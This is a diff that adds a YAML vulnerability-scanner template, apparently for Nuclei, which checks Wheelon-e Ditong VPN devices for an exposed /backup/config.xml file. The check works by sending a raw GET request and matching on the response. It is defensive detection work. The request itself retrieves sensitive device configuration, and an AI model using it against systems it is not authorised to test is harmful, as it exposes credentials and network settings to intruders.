@@ -1,0 +1,24 @@
+id: wheelon-e-vpn-infoleak
+info:
+  name: Wheelon-e Ditong VPN Information Leakage
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Wheelon-e Ditong VPN is a next-generation application-layer firewall hardware device, suitable for small and medium-sized enterprises. This vulnerability involves information leakage in /backup/config.xml, which may expose sensitive configuration data.
+  tags: information-disclosure
+  reference:
+    - https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=1820
+http:
+  - raw:
+      - |
+        GET /backup/config.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "config"
